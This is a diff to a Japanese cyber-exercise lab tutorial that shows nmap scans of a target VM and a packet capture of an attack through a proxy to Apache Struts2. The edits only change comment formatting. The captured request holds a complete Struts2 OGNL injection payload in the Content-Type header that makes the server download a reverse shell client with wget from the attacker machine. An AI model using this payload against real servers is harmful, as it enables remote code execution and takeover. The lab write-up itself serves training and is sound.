@@ -68,7 +68,7 @@ nmapは、ネットワーク調査ツールおよびセキュリティ/ポート
   * ファイアウォールの特定
 本演習環境でAttacker OSからTarget OSをnmapでスキャンすると、以下の情報が得られる。
 
-/// OS情報、ポート情報
++ OS情報、ポート情報
 ```
 vagrant@attacker:~$ sudo nmap -O target.cyexc-target
 
@@ -84,7 +84,7 @@ PORT     STATE SERVICE
 MAC Address: 08:00:27:A1:5A:8A (Cadmus Computer Systems)
 No exact OS matches for host (If you know what OS is running on it, see http://nmap.org/submit/ ).
 ````
-/// 特定ポートのサービスアプリケーション
++ 特定ポートのサービスアプリケーション
 ```
 vagrant@attacker:~$ sudo nmap -sV -p 80,8080 target.cyexc-target
 
@@ -126,14 +126,13 @@ CONTAINER ID        IMAGE                 COMMAND                  CREATED      
 vagrant@webgoat:~/apps$ sudo docker cp 937fb140f393:/ngrep.log .  
 ```
 
-/// Attacker OSからproxyサーバへのHTTPリクエスト
-/// シェルコマンドが送信されているのがわかる
-  T 192.168.33.20:57860 -> 192.168.1.100:80 [AP]
++ Attacker OSからproxyサーバへのHTTPリクエスト。シェルコマンドが送信されているのがわかる。   <br>
+  T 192.168.33.20:57860 -> 192.168.1.100:80 [AP]
   GET /struts2-showcase-2.3.12/index.action HTTP/1.1.
   User-Agent: Mozilla/5.0.
   Content-Type: Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#**cmd='wget http&#58;//192.168.33.20:8081/reverseShellClient.js'**).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.
 
-/// proxyサーバからApache Struts2に転送
++ proxyサーバからApache Struts2に転送  <br>
   T 192.168.1.100:37888 -> 192.168.1.10:8080 [AP]
   GET /struts2-showcase-2.3.12/index.action HTTP/1.1.
   X-Forwarded-Host: target.cyexc-target.
